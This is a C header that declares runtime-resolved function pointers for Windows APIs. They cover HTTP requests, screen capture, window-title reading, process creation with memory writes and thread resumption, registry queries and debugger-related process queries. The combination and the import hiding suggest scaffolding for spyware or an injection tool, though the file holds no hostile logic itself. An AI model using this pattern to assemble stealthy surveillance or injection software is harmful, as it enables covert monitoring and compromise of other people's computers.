#ifndef DYNAMIC_LINKING_H
#define DYNAMIC_LINKING_H

#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <winternl.h>
#include <dshow.h>

// ============================================================================
// WININET.H Function Pointers
// ============================================================================
typedef HINTERNET (WINAPI *PFN_InternetOpenA)(
    LPCSTR lpszAgent,
    DWORD dwAccessType,
    LPCSTR lpszProxy,
    LPCSTR lpszProxyBypass,
    DWORD dwFlags
);

typedef HINTERNET (WINAPI *PFN_InternetConnectA)(
    HINTERNET hInternet,
    LPCSTR lpszServerName,
    INTERNET_PORT nServerPort,
    LPCSTR lpszUserName,
    LPCSTR lpszPassword,
    DWORD dwService,
    DWORD dwFlags,
    DWORD_PTR dwContext
);

typedef HINTERNET (WINAPI *PFN_HttpOpenRequestA)(
    HINTERNET hConnect,
    LPCSTR lpszVerb,
    LPCSTR lpszObjectName,
    LPCSTR lpszVersion,
    LPCSTR lpszReferrer,
    LPCSTR *lplpszAcceptTypes,
    DWORD dwFlags,
    DWORD_PTR dwContext
);

typedef BOOL (WINAPI *PFN_HttpSendRequestA)(
    HINTERNET hRequest,
    LPCSTR lpszHeaders,
    DWORD dwHeadersLength,
    LPVOID lpOptional,
    DWORD dwOptionalLength
);

typedef BOOL (WINAPI *PFN_InternetReadFile)(
    HINTERNET hFile,
    LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead,
    LPDWORD lpdwNumberOfBytesRead
);

typedef BOOL (WINAPI *PFN_InternetCloseHandle)(
    HINTERNET hInternet
);

// ============================================================================
// KERNEL32.H Function Pointers (commonly used)
// ============================================================================
typedef HWND (WINAPI *PFN_GetDesktopWindow)(void);

typedef HDC (WINAPI *PFN_GetDC)(HWND hWnd);

typedef HDC (WINAPI *PFN_CreateCompatibleDC)(HDC hdc);

typedef int (WINAPI *PFN_GetDeviceCaps)(HDC hdc, int index);

typedef HBITMAP (WINAPI *PFN_CreateCompatibleBitmap)(
    HDC hdc,
    int cx,
    int cy
);

typedef HGDIOBJ (WINAPI *PFN_SelectObject)(HDC hdc, HGDIOBJ h);

typedef BOOL (WINAPI *PFN_BitBlt)(
    HDC hdc,
    int x,
    int y,
    int cx,
    int cy,
    HDC hdcSrc,
    int x1,
    int y1,
    DWORD rop
);

typedef int (WINAPI *PFN_GetObject)(HGDIOBJ h, int c, LPVOID pv);

typedef BOOL (WINAPI *PFN_ReleaseDC)(HWND hWnd, HDC hDC);

typedef BOOL (WINAPI *PFN_DeleteDC)(HDC hdc);

typedef BOOL (WINAPI *PFN_DeleteObject)(HGDIOBJ ho);

typedef int (WINAPI *PFN_GetDIBits)(
    HDC hdc,
    HBITMAP hbm,
    UINT start,
    UINT cLines,
    LPVOID lpvBits,
    LPBITMAPINFO lpbmi,
    UINT usage
);

typedef DWORD (WINAPI *PFN_GetFileAttributesA)(LPCSTR lpFileName);

typedef HANDLE (WINAPI *PFN_CreateFileA)(
    LPCSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);

typedef BOOL (WINAPI *PFN_ReadFile)(
    HANDLE hFile,
    LPVOID lpBuffer,
    DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI *PFN_CloseHandle)(HANDLE hObject);

typedef BOOL (WINAPI *PFN_CreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *PFN_ReadProcessMemory)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesRead
);

typedef BOOL (WINAPI *PFN_WriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);

typedef DWORD (WINAPI *PFN_ResumeThread)(HANDLE hThread);

typedef BOOL (WINAPI *PFN_GetWindowTextA)(
    HWND hWnd,
    LPSTR lpString,
    int nMaxCount
);

typedef HWND (WINAPI *PFN_GetForegroundWindow)(void);

typedef DWORD (WINAPI *PFN_GetWindowThreadProcessId)(
    HWND hWnd,
    LPDWORD lpdwProcessId
);

typedef HANDLE (WINAPI *PFN_GetStdHandle)(DWORD nStdHandle);

typedef BOOL (WINAPI *PFN_ReadConsoleA)(
    HANDLE hConsoleInput,
    LPVOID lpBuffer,
    DWORD nNumberOfCharsToRead,
    LPDWORD lpNumberOfCharsRead,
    LPVOID pInputControl
);

typedef LONG (WINAPI *PFN_RegOpenKeyExA)(
    HKEY hKey,
    LPCSTR lpSubKey,
    DWORD ulOptions,
    REGSAM samDesired,
    PHKEY phkResult
);

typedef LONG (WINAPI *PFN_RegQueryValueExA)(
    HKEY hKey,
    LPCSTR lpValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
);

typedef LONG (WINAPI *PFN_RegCloseKey)(HKEY hKey);

// ============================================================================
// WINCRYPT.H Function Pointers
// ============================================================================
typedef BOOL (WINAPI *PFN_CryptCreateHash)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTKEY hKey,
    DWORD dwFlags,
    HCRYPTHASH *phHash
);

typedef BOOL (WINAPI *PFN_CryptHashData)(
    HCRYPTHASH hHash,
    const BYTE *pbData,
    DWORD dwDataLen,
    DWORD dwFlags
);

typedef BOOL (WINAPI *PFN_CryptGetHashParam)(
    HCRYPTHASH hHash,
    DWORD dwParam,
    BYTE *pbData,
    DWORD *pdwDataLen,
    DWORD dwFlags
);

typedef BOOL (WINAPI *PFN_CryptDestroyHash)(HCRYPTHASH hHash);

typedef BOOL (WINAPI *PFN_CryptAcquireContextA)(
    HCRYPTPROV *phProv,
    LPCSTR szContainer,
    LPCSTR szProvider,
    DWORD dwProvType,
    DWORD dwFlags
);

typedef BOOL (WINAPI *PFN_CryptReleaseContext)(
    HCRYPTPROV hProv,
    DWORD dwFlags
);

// ============================================================================
// WINTERNL.H Function Pointers
// ============================================================================
typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// ============================================================================
// Global Function Pointer Structure
// ============================================================================
typedef struct {
    // WININET functions
    PFN_InternetOpenA pInternetOpenA;
    PFN_InternetConnectA pInternetConnectA;
    PFN_HttpOpenRequestA pHttpOpenRequestA;
    PFN_HttpSendRequestA pHttpSendRequestA;
    PFN_InternetReadFile pInternetReadFile;
    PFN_InternetCloseHandle pInternetCloseHandle;

    // KERNEL32 functions (graphics/window)
    PFN_GetDesktopWindow pGetDesktopWindow;
    PFN_GetDC pGetDC;
    PFN_CreateCompatibleDC pCreateCompatibleDC;
    PFN_GetDeviceCaps pGetDeviceCaps;
    PFN_CreateCompatibleBitmap pCreateCompatibleBitmap;
    PFN_SelectObject pSelectObject;
    PFN_BitBlt pBitBlt;
    PFN_GetObject pGetObject;
    PFN_ReleaseDC pReleaseDC;
    PFN_DeleteDC pDeleteDC;
    PFN_DeleteObject pDeleteObject;
    PFN_GetDIBits pGetDIBits;

    // KERNEL32 functions (file I/O)
    PFN_GetFileAttributesA pGetFileAttributesA;
    PFN_CreateFileA pCreateFileA;
    PFN_ReadFile pReadFile;
    PFN_CloseHandle pCloseHandle;

    // KERNEL32 functions (process)
    PFN_CreateProcessA pCreateProcessA;
    PFN_ReadProcessMemory pReadProcessMemory;
    PFN_WriteProcessMemory pWriteProcessMemory;
    PFN_ResumeThread pResumeThread;

    // KERNEL32 functions (window/input)
    PFN_GetWindowTextA pGetWindowTextA;
    PFN_GetForegroundWindow pGetForegroundWindow;
    PFN_GetWindowThreadProcessId pGetWindowThreadProcessId;
    PFN_GetStdHandle pGetStdHandle;
    PFN_ReadConsoleA pReadConsoleA;

    // ADVAPI32 functions (registry)
    PFN_RegOpenKeyExA pRegOpenKeyExA;
    PFN_RegQueryValueExA pRegQueryValueExA;
    PFN_RegCloseKey pRegCloseKey;

    // ADVAPI32 functions (crypto)
    PFN_CryptCreateHash pCryptCreateHash;
    PFN_CryptHashData pCryptHashData;
    PFN_CryptGetHashParam pCryptGetHashParam;
    PFN_CryptDestroyHash pCryptDestroyHash;
    PFN_CryptAcquireContextA pCryptAcquireContextA;
    PFN_CryptReleaseContext pCryptReleaseContext;

    // NTDLL functions
    PFN_NtQueryInformationProcess pNtQueryInformationProcess;

} DynamicFunctions;

// Global instance
extern DynamicFunctions g_DynFuncs;

// ============================================================================
// Initialization Function
// ============================================================================
BOOL InitializeDynamicFunctions(void);

// ============================================================================
// Macro Wrappers for easier code migration
// ============================================================================
#define DynInternetOpenA g_DynFuncs.pInternetOpenA
#define DynInternetConnectA g_DynFuncs.pInternetConnectA
#define DynHttpOpenRequestA g_DynFuncs.pHttpOpenRequestA
#define DynHttpSendRequestA g_DynFuncs.pHttpSendRequestA
#define DynInternetReadFile g_DynFuncs.pInternetReadFile
#define DynInternetCloseHandle g_DynFuncs.pInternetCloseHandle

#define DynGetDesktopWindow g_DynFuncs.pGetDesktopWindow
#define DynGetDC g_DynFuncs.pGetDC
#define DynCreateCompatibleDC g_DynFuncs.pCreateCompatibleDC
#define DynGetDeviceCaps g_DynFuncs.pGetDeviceCaps
#define DynCreateCompatibleBitmap g_DynFuncs.pCreateCompatibleBitmap
#define DynSelectObject g_DynFuncs.pSelectObject
#define DynBitBlt g_DynFuncs.pBitBlt
#define DynGetObject g_DynFuncs.pGetObject
#define DynReleaseDC g_DynFuncs.pReleaseDC
#define DynDeleteDC g_DynFuncs.pDeleteDC
#define DynDeleteObject g_DynFuncs.pDeleteObject
#define DynGetDIBits g_DynFuncs.pGetDIBits

#define DynGetFileAttributesA g_DynFuncs.pGetFileAttributesA
#define DynCreateFileA g_DynFuncs.pCreateFileA
#define DynReadFile g_DynFuncs.pReadFile
#define DynCloseHandle g_DynFuncs.pCloseHandle

#define DynCreateProcessA g_DynFuncs.pCreateProcessA
#define DynReadProcessMemory g_DynFuncs.pReadProcessMemory
#define DynWriteProcessMemory g_DynFuncs.pWriteProcessMemory
#define DynResumeThread g_DynFuncs.pResumeThread

#define DynGetWindowTextA g_DynFuncs.pGetWindowTextA
#define DynGetForegroundWindow g_DynFuncs.pGetForegroundWindow
#define DynGetWindowThreadProcessId g_DynFuncs.pGetWindowThreadProcessId
#define DynGetStdHandle g_DynFuncs.pGetStdHandle
#define DynReadConsoleA g_DynFuncs.pReadConsoleA

#define DynRegOpenKeyExA g_DynFuncs.pRegOpenKeyExA
#define DynRegQueryValueExA g_DynFuncs.pRegQueryValueExA
#define DynRegCloseKey g_DynFuncs.pRegCloseKey

#define DynCryptCreateHash g_DynFuncs.pCryptCreateHash
#define DynCryptHashData g_DynFuncs.pCryptHashData
#define DynCryptGetHashParam g_DynFuncs.pCryptGetHashParam
#define DynCryptDestroyHash g_DynFuncs.pCryptDestroyHash
#define DynCryptAcquireContextA g_DynFuncs.pCryptAcquireContextA
#define DynCryptReleaseContext g_DynFuncs.pCryptReleaseContext

#define DynNtQueryInformationProcess g_DynFuncs.pNtQueryInformationProcess

#endif // DYNAMIC_LINKING_H
